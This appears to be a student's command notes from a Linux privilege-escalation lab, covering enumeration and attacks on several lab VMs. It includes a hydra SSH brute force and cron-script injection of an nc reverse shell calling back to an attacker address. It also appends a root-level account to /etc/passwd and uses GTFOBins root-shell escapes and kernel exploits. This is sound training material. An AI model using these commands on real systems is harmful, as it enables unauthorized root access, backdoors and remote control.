manual enumeration VM 1
```
ssh joe@192.168.234.214
id
cat /etc/passwd
```

get OS info
```
cat /etc/issue
cat /etc/os-release
uname -a
```

find processes
```
ps aux
ifconfig
ip a
route
routel
```

display active network connections
```
ss -anp
```

firewall
```
cat /etc/iptables/rules.v4
```

cron
```
ls -lah /etc/cron*
crontab -l
```

crons run by root
```
sudo crontab -l
```

find writable directories for current user
```
find / -writable -type d 2>/dev/null
```

list mounted filesystems
```
mount
```

list filesystems mounted at boot time
```
cat /etc/fstab 
```

view available disks
```
lsblk
```

enumerate loaded kernel modules
```
lsmod
```

find SUID marked binaries
```
find / -perm -u=s -type f 2>/dev/null
```

### auto enumeration VM 1
- tools: unix-privesc-check, lineum, linpeas
- http://pentestmonkey.net/tools/unix-privesc-check

```
ssh joe@192.168.234.214

unix-privesc-check
whereis unix-privesc-check
scp -r /usr/share/unix-privesc-check joe@192.168.234.214:/home/joe
./unix-privesc-check standard > output.txt
```

confidential info VM 1
```
ssh joe@192.168.234.214
su - root
```

generate custom wordlist
```
crunch 6 6 -t Lab%%% > wordlist
hydra -l eve -P wordlist  192.168.234.214 -t 4 ssh -V
 
ssh eve@192.168.234.214
```

list sudo perms
```
sudo -l
```

if admin, elevate directly to root
```
sudo -i
```

inspecting service footprints VM 1
```
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

Abusing cronjobs
```
ssh joe@192.168.234.214
```

enumerate crons
```
ls -lah /etc/cron*
crontab -l
sudo crontab -l
echo >> this_is_fine.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.181 4444 >/tmp/f" >> this_is_fine.sh
```

abusing password auth VM 1
```
ssh joe@192.168.234.214
openssl passwd w00t
echo "root2:EHcSMweaJfGZc:0:0:root:/root:/bin/bash" >> /etc/passwd
```

abusing setuid binaries
```
passwd # leave running
ps u -C passwd
```

Filtering by the "Uid" keyword returns four parameters that correspond to the real, effective, saved set, and filesystem UIDs
```
grep Uid /proc/1722/status
ls -asl /usr/bin/passwd
```

find is setting the s flag, meaning we can use it to get a root shell
```
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

search for misconfigured binaries
```
/usr/sbin/getcap -r / 2>/dev/null
```


check this list https://gtfobins.github.io/ - below command is from searching 'perl' on the site
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

find setuid marked binaries
```
find / -perm -u=s -type f 2>/dev/null
```
### abusing sudo
list sudo priv
```
sudo -l
```
https://gtfobins.github.io/gtfobins/tcpdump/#sudo
```
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

apparmor is blocking this so no worky
```
su - root
aa-status
```
try apt-get instead: https://gtfobins.github.io/gtfobins/apt-get/#sudo

### exploit kernel vulnerabilities
```
ssh joe@192.168.234.216
cat /etc/issue
uname -r
arch
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
mv 45010.c cve-2017-16995.c
scp cve-2017-16995.c joe@192.168.234.216:
file cve-2017-16995
./cve-2017-16995s
```

### VM 2
```
ssh joe@192.168.234.216
4.4.0-116-generic
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep  "4."
linux/local/44298.c
cp /usr/share/exploitdb/exploits/linux/local/44298.c .
```
well that failed just use pwnkit
- https://github.com/ly4k/PwnKit

### VM 3
```
ssh student@192.168.234.52 -p 2222
```

enumerate crons
```
ls -lah /etc/cron*
crontab -l
sudo crontab -l
```

look in /etc/crontab.hourly etc to find file paths of cronjobs and look for write perms
```
ls -lah /var/archives/archive.sh
cd /var/archives
echo >> archive.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.181 4444 >/tmp/f" >> archive.sh
```

on kali start reverse shell
```
nc -nvlp 4444
```
### VM 4
```
ssh student@192.168.234.52 -p 2222
```

find writable files for current user
```
find / -writable -type f 2>/dev/null
```

we find /etc/passwd
```
openssl passwd w00t
echo "root2:Y313qPRlW17oU:0:0:root:/root:/bin/bash" >> /etc/passwd
```

### VM 5
```
ssh student@192.168.234.52 -p 2222
```

find setuid marked binaries
```
find / -perm -u=s -type f 2>/dev/null
```
- look up the find command on gtfobins and run the suid command
- https://gtfobins.github.io/gtfobins/find/#suid















